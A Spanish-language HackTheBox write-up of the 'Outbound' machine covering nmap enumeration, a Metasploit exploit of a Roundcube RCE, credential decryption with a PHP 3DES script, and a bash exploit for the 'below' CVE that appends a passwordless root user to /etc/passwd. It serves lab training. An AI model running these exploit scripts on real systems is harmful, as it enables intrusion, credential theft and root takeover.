+++ 
draft = false
date = 2025-11-25T23:44:00Z
title = "Outbound Machine - HackTheBox"
description = ""
slug = ""
authors = []
tags = []
categories = []
externalLink = ""
series = []
+++

-----------------------------
- Tags: #Machine #Linux #Easy #Roundcube #3DESdecrypt #metasploit #mysql #below
----------------
# Credenciales de inicio

HacktheBox nos da las siguientes credenciales: `tyler / LhKL1o9Nm3X2`

<img src="/images/Pasted image 20250826221217.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración Nmap
**Comando:**
```bash
nmap -p- --open -sS -vvv --min-rate 5000 -n -Pn 10.10.11.35 -oG allPorts
```

<img src="/images/Pasted image 20250826220753.png" style="width:100%; height:auto; display:block; margin:auto;">

Al realizar verificación de versiones de los puertos nos encontramos con el dominio
`mail.outbound.htb`

<img src="/images/Pasted image 20250826220852.png" style="width:100%; height:auto; display:block; margin:auto;">

El cual lo agregamos a nuestro /etc/hosts

<img src="/images/Pasted image 20250826220913.png" style="width:100%; height:auto; display:block; margin:auto;">

# Enumeración puerto HTTP 80

Entrando a la página web nos encontramos un login de #RoundcubeWebmail

<img src="/images/Pasted image 20250826221103.png" style="width:100%; height:auto; display:block; margin:auto;">

Nos logueamos con las **Credenciales de inicio** y entramos a la página de webmail

<img src="/images/Pasted image 20250826223722.png" style="width:100%; height:auto; display:block; margin:auto;">

Buscando un poco encontramos la versión de Roundcube Webmail 1.6.10

<img src="/images/Pasted image 20250826223801.png" style="width:100%; height:auto; display:block; margin:auto;">

La cual contiene  CVE-2025-49113 de RCE Authenticated

Para explotarlo utilizaremos metasploit

<img src="/images/Pasted image 20250826233100.png" style="width:100%; height:auto; display:block; margin:auto;">

Colocamos los siguiente parametros al exploit<img src="/images/Pasted image 20250826233730.png" style="width:100%; height:auto; display:block; margin:auto;">

y corremos el exploit ganando acceso a la máquina

<img src="/images/Pasted image 20250826233825.png" style="width:100%; height:auto; display:block; margin:auto;">

# Consiguiendo consola

Para conseguir una consola fuera de metasploit primero usamos el comando shell, y luego ejecutamos una reverse shell en bash

<img src="/images/Pasted image 20250826234052.png" style="width:100%; height:auto; display:block; margin:auto;">

# Tratamiento tty

Aplicamos los siguientes comandos

```bash
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 39 columns 157
```

# Movimiento lateral

Dentro de los archivos de configuración de roundcube, el archivo `/html/roundcube/config/config.inc.php` contiene dos contraseñas, la contraseña de la base de datos: `RCDBPass2025` y la llave de desencriptado `rcmail-!24ByteDESkey*Str`

<img src="/images/Pasted image 20250826235041.png" style="width:100%; height:auto; display:block; margin:auto;">

Nos conectamos a la base de datos #mysql de forma local

```bash
mysql -u roundcube -h localhost -p
```

<img src="/images/Pasted image 20250826235415.png" style="width:100%; height:auto; display:block; margin:auto;">

de la base de datos extraemos los datos que están en la tabla session, columna vars

<img src="/images/Pasted image 20250826235645.png" style="width:100%; height:auto; display:block; margin:auto;">

Al decodificarla en base64 tenemos la siguiente contraseña cifrada del usuario jacob

<img src="/images/Pasted image 20250827001614.png" style="width:100%; height:auto; display:block; margin:auto;">

La cual podemos descifrar con la llave de desencriptado `rcmail-!24ByteDESkey*Str`
Para eso busqué como hacerlo encontrando un script en un foro que no funcionaba, pero pasandolo a chatgpt para que lo corrija

Teniendo el siguiente script #Roundcubedecryptscript

```php
<?php
function decrypt_3des_openssl($cipher_b64, $key) {
    $cipher_raw = base64_decode($cipher_b64);
 
    // En modo CBC, el IV está al principio del texto cifrado
    $iv = substr($cipher_raw, 0, 8);         // 3DES usa un IV de 8 bytes
    $cipher = substr($cipher_raw, 8);
 
    $decrypted = openssl_decrypt(
        $cipher,
        'des-ede3-cbc',   // 3DES modo CBC
        $key,
        OPENSSL_RAW_DATA,
        $iv
    );
 
    // El cifrado original agregaba un "canary byte" al final, lo quitamos
    return $decrypted;
}
 
// === Prueba ===
$cipher = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/';
$key = 'rcmail-!24ByteDESkey*Str'; // Exactamente 24 caracteres (clave válida para 3DES)
 
$decrypted = decrypt_3des_openssl($cipher, $key);
echo "Texto descifrado: " . $decrypted;
?>
```

Al correrlo nos da la siguiente password

<img src="/images/Pasted image 20250827003157.png" style="width:100%; height:auto; display:block; margin:auto;">

Utilizamos la contraseña para cambiarnos al usuario jacob

Dentro del usuario jacob vamos a su home, donde encontramos una carpeta de mail y vemos un correo en su INBOX el cual contiene una contraseña `gY4Wr3a1evp4`

<img src="/images/Pasted image 20250827003558.png" style="width:100%; height:auto; display:block; margin:auto;">

esa la utilizaremos para conectarnos por ssh a jacob, debido a que actualmente nos encontramos en un contenedor

<img src="/images/Pasted image 20250827003647.png" style="width:100%; height:auto; display:block; margin:auto;">

<img src="/images/Pasted image 20250827003737.png" style="width:100%; height:auto; display:block; margin:auto;">

Obtenemos la flag de usuario no privilegiado

<img src="/images/Pasted image 20250827004421.png" style="width:100%; height:auto; display:block; margin:auto;">

# Escalada de privilegios

#below 

Al ver los privilegios sudoers tenemos la capacidad de utilizar below con privilegios sudo

<img src="/images/Pasted image 20250827003812.png" style="width:100%; height:auto; display:block; margin:auto;">

Buscando por "below privilege escalation" en google, nos da un CVE-2025-27591

<img src="/images/Pasted image 20250827003920.png" style="width:100%; height:auto; display:block; margin:auto;">

Bajando un poco nos encontramos con un script de bash en github

<img src="/images/Pasted image 20250827004000.png" style="width:100%; height:auto; display:block; margin:auto;">

El cual explota la vulnerabilidad, pero tiene errores en su script, por tanto lo modificaré quedando finalmente así:

#belowprivilegescalationscript

```bash
#!/bin/bash
rm -f /var/log/below/error_root.log
ln -s /etc/passwd /var/log/below/error_root.log
export LOGS_DIRECTORY=/var/log/below
sudo /usr/bin/below snapshot --begin now 2>/dev/null || true
echo 'rkx::0:0:root:/root:/bin/bash' >> /var/log/below/error_root.log
su rkx
```

Al ejecutar nuestro script obtenemos acceso al usuario root

<img src="/images/Pasted image 20250827004527.png" style="width:100%; height:auto; display:block; margin:auto;">

y posteriormente leyendo el archivo `/root/root.txt` obtenemos la flag de root, pwneando la máquina

<img src="/images/Pasted image 20250827004545.png" style="width:100%; height:auto; display:block; margin:auto;">
